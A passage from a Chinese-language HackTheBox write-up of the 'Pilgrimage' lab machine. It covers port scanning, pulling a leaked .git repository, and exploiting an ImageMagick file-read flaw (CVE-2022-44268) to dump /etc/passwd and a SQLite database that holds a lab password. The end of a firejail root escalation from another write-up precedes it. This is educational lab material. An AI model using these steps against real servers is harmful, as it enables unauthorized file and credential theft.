firejail --join=239891 Warning: cleaning all supplementary groups changing root to /proc/239891/root Child process initialized in 7.52 ms su - id uid=0(root) gid=0(root) groups=0(root)","categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"gpg,ssti","slug":"gpg-ssti","permalink":"someb0dy.github.io/tags/gpg-ssti/"}]},{"title":"Pilgrimage","slug":"Pilgrimage","date":"2023-06-25T16:02:30.834Z","updated":"2023-06-25T16:04:30.853Z","comments":true,"path":"2023/06/26/Pilgrimage/","link":"","permalink":"someb0dy.github.io/2023/06/26/Pilgrimage/","excerpt":"","text":"2023年6月25日 19:51:38 UserNmap┌──(root💀kali)-[/home/kali/hacktheboxtools] └─# nmap -p- --min-rate 10000 10.10.11.219 130 ⨯ Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 07:51 EDT Nmap scan report for 10.10.11.219 Host is up (0.11s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 10.45 seconds ┌──(root💀kali)-[/home/kali/hacktheboxtools] └─# nmap -p22,80 -sCV --min-rate 10000 10.10.11.219 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 07:52 EDT Nmap scan report for 10.10.11.219 Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 20be60d295f628c1b7e9e81706f168f3 (RSA) | 256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA) |_ 256 d14e293c708669b4d72cc80b486e9804 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://pilgrimage.htb/ |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds 22,80 经典开局两端口 echo &quot;10.10.11.219 pilgrimage.htb&quot; &gt;&gt;/etc/hosts 80 image.png 这里有一个缩小文件空间的上传点 image.png dirsearch image.png git 泄露通过Githack 把源码下载来下Repository:https://github.com/lijiejie/GitHack ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/Pilgrimage/Githack] └─# python3 GitHack.py http://pilgrimage.htb/.git 255 ⨯ [+] Download and parse index file ... [+] assets/bulletproof.php [+] assets/css/animate.css [+] assets/css/custom.css [+] assets/css/flex-slider.css [+] assets/css/fontawesome.css [+] assets/css/owl.css [+] assets/css/templatemo-woox-travel.css [+] assets/images/banner-04.jpg [+] assets/images/cta-bg.jpg [+] assets/js/custom.js [+] assets/js/isotope.js [+] assets/js/isotope.min.js [+] assets/js/owl-carousel.js [+] assets/js/popup.js [+] assets/js/tabs.js [+] assets/webfonts/fa-brands-400.ttf [+] assets/webfonts/fa-brands-400.woff2 [+] assets/webfonts/fa-regular-400.ttf [+] assets/webfonts/fa-regular-400.woff2 [+] assets/webfonts/fa-solid-900.ttf [+] assets/webfonts/fa-solid-900.woff2 [+] assets/webfonts/fa-v4compatibility.ttf [+] assets/webfonts/fa-v4compatibility.woff2 [+] dashboard.php [+] index.php [+] login.php [+] logout.php [+] magick [+] register.php [+] vendor/bootstrap/css/bootstrap.min.css [+] vendor/bootstrap/js/bootstrap.min.js [+] vendor/jquery/jquery.js [+] vendor/jquery/jquery.min.js [+] vendor/jquery/jquery.min.map [+] vendor/jquery/jquery.slim.js [+] vendor/jquery/jquery.slim.min.js [+] vendor/jquery/jquery.slim.min.map [OK] assets/bulletproof.php [OK] assets/css/custom.css [Error] [Errno 17] File exists: &#39;pilgrimage.htb/assets/css&#39; [Error] [Errno 17] File exists: &#39;pilgrimage.htb/assets/css&#39; [OK] assets/css/owl.css [OK] assets/js/custom.js [OK] assets/css/templatemo-woox-travel.css [OK] assets/css/fontawesome.css [OK] assets/images/cta-bg.jpg [OK] assets/js/isotope.js [OK] assets/css/flex-slider.css [OK] assets/css/animate.css [OK] assets/js/popup.js [OK] assets/js/owl-carousel.js [OK] assets/js/isotope.min.js [OK] assets/images/banner-04.jpg [OK] assets/webfonts/fa-regular-400.woff2 [OK] assets/webfonts/fa-regular-400.ttf [OK] assets/webfonts/fa-v4compatibility.ttf [OK] assets/js/tabs.js [OK] assets/webfonts/fa-brands-400.ttf [OK] assets/webfonts/fa-v4compatibility.woff2 [OK] assets/webfonts/fa-brands-400.woff2 [OK] dashboard.php [OK] index.php [OK] logout.php [OK] login.php [OK] assets/webfonts/fa-solid-900.ttf [OK] assets/webfonts/fa-solid-900.woff2 [OK] register.php [OK] vendor/bootstrap/js/bootstrap.min.js [OK] vendor/bootstrap/css/bootstrap.min.css [OK] vendor/jquery/jquery.min.js [OK] vendor/jquery/jquery.slim.min.js [OK] vendor/jquery/jquery.slim.js [OK] vendor/jquery/jquery.min.map [OK] vendor/jquery/jquery.js [OK] vendor/jquery/jquery.slim.min.map [OK] magick ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/Pilgrimage/Githack] └─# ls GitHack.py index lib lib.zip pilgrimage.htb 通过.git泄露出网站源代码后我们经过简单的审计exec 命令执行没戏，文件上传没戏，sql注入没戏,好像无路可走了但是这源代码中还有一个magick 二进制文件 image.png Google一下!!! image.png CVE-2022-44628https://xz.aliyun.com/t/12133 CVE-2022-44268：ImageMagick 7.1.0-49 存在信息泄露漏洞。当它解析 PNG 图像（例如，用于调整大小）时，生成的图像中可能会嵌入任意本地文件的内容（如果 ImageMagick 二进制文件有读取权限）。 POC:https://github.com/voidz0r/CVE-2022-44268 image.png 执行之后当前目录下生成了一个image.png我们尝试上传 image.png 使用curl 保存到本地 curl http://pilgrimage.htb/shrunk/64984cf2658a8.png -o out.png 再使用identify 来看图片详细数据 ┌──(root💀kali)-[/home/…/machine/Pilgrimage/CVE-2022-44628/CVE-2022-44268] └─# identify -verbose out.png Image: Filename: out.png Format: PNG (Portable Network Graphics) Mime type: image/png Class: PseudoClass Geometry: 100x100+0+0 Units: Undefined Colorspace: sRGB Type: Palette Base type: Undefined Endianness: Undefined Depth: 8/1-bit Channel depth: red: 1-bit green: 1-bit blue: 1-bit Channel statistics: Pixels: 10000 Red: min: 255 (1) max: 255 (1) mean: 255 (1) standard deviation: 0 (0) kurtosis: 8.192e+51 skewness: 1e+36 entropy: 0 Green: min: 0 (0) max: 0 (0) mean: 0 (0) standard deviation: 0 (0) kurtosis: -3 skewness: 0 entropy: 0 Blue: min: 0 (0) max: 0 (0) mean: 0 (0) standard deviation: 0 (0) kurtosis: -3 skewness: 0 entropy: 0 Image statistics: Overall: min: 0 (0) max: 255 (1) mean: 85 (0.333333) standard deviation: 0 (0) kurtosis: -1.5001 skewness: 0.707071 entropy: 0 Colors: 1 Histogram: 10000: (255,0,0) #FF0000 red Colormap entries: 2 Colormap: 0: (255,0,0) #FF0000 red 1: (255,255,255) #FFFFFF white Rendering intent: Perceptual Gamma: 0.45455 Chromaticity: red primary: (0.64,0.33) green primary: (0.3,0.6) blue primary: (0.15,0.06) white point: (0.3127,0.329) Background color: srgb(99.6124%,99.6124%,99.6124%) Border color: srgb(223,223,223) Matte color: grey74 Transparent color: black Interlace: None Intensity: Undefined Compose: Over Page geometry: 100x100+0+0 Dispose: Undefined Iterations: 0 Compression: Zip Orientation: Undefined Properties: date:create: 2023-06-25T14:20:40+00:00 date:modify: 2023-06-25T14:20:40+00:00 date:timestamp: 2023-06-25T14:19:30+00:00 png:bKGD: chunk was found (see Background color, above) png:cHRM: chunk was found (see Chromaticity, above) png:gAMA: gamma=0.45455 (See Gamma, above) png:IHDR.bit-depth-orig: 1 png:IHDR.bit_depth: 1 png:IHDR.color-type-orig: 3 png:IHDR.color_type: 3 (Indexed) png:IHDR.interlace_method: 0 (Not interlaced) png:IHDR.width,height: 100, 100 png:PLTE.number_colors: 2 png:sRGB: intent=0 (Perceptual Intent) png:text: 4 tEXt/zTXt/iTXt chunks were found png:tIME: 2023-06-25T14:19:30Z Raw profile type: 1437 726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d 6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f 6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e 2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269 6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f 62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d 65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a 2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a 783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f 6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372 2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73 706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31 303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f 6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573 722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d 646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b 75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f 7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69 7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67 696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73 62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d 5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e 6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334 3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e 2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374 656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72 6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65 6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e 0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052 65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f 6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973 74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573 796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69 7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c 6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d 652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78 3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f 7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f 737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938 3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a signature: d02a8da86fec6ef80c209c8437c76cf8fbecb6528cd7ba95ef93eecc52a171c7 Artifacts: filename: out.png verbose: true Tainted: False Filesize: 1080B Number pixels: 10000 Pixels per second: 7.09341MB User time: 0.010u Elapsed time: 0:01.001 Version: ImageMagick 6.9.11-60 Q16 x86_64 2021-01-25 https://imagemagick.org image.png 对中间这一串使用hex解码得到&#x2F;etc&#x2F;passwd的内容 ,我们可以使用print 命令来快速进行格式化 ┌──(root💀kali)-[/home/…/machine/Pilgrimage/CVE-2022-44628/CVE-2022-44268] └─# print &quot;root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\\nsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\\nemily:x:1000:1000:emily,,,:/home/emily:/bin/bash\\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\\n_laurel:x:998:998::/var/log/laurel:/bin/false\\n&quot; root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:109::/nonexistent:/usr/sbin/nologin systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin emily:x:1000:1000:emily,,,:/home/emily:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin _laurel:x:998:998::/var/log/laurel:/bin/false 带sh的用户 root:x:0:0:root:/root:/bin/bash emily:x:1000:1000:emily,,,:/home/emily:/bin/bash sshd:x:105:65534::/run/sshd:/usr/sbin/nologin image.png 这里有一个数据库文件，我们尝试读取这个 &#x2F;var&#x2F;db&#x2F;pilgrimage读取到后这其实是一个db文件，我们需要把他还原回来,并且写入 s=b&quot;53514c69746520666f726d617420330010000101004020200000011a0000000a0000000000000000000000040000000400000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000011a002e4b910d0ff800040eba000f650fcd0eba0f380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007c03071719190181537461626c65696d61676573696d6167657304435245415445205441424c4520696d61676573202875726c2054455854205052494d415259204b4559204e4f54204e554c4c2c206f726967696e616c2054455854204e4f54204e554c4c2c20757365726e616d652054455854204e4f54204e554c4c292b0406173f190100696e64657873716c6974655f6175746f696e6465785f696d616765735f31696d616765730566010717171701812b7461626c657573657273757365727302435245415445205441424c452075736572732028757365726e616d652054455854205052494d415259204b4559204e4f54204e554c4c2c2070617373776f72642054455854204e4f54204e554c4c29290206173d170100696e64657873716c6974655f6175746f696e6465785f75736572735f3175736572730300000008000000000d000000080f93000fe60fd10fc80fb90fae0fa70f9a0f930000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000508030f0f62620b0703151573617870313233340506030f0f616109050313137465737465730d0403171761646d696e61646d696e0703031111757575751302031d1d74657374323932397465737432393239180103172d656d696c796162696763686f6e6b79626f693132330a000000080fbc000fcb0fd90fbc0ff70fc20fd10fea0fe300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000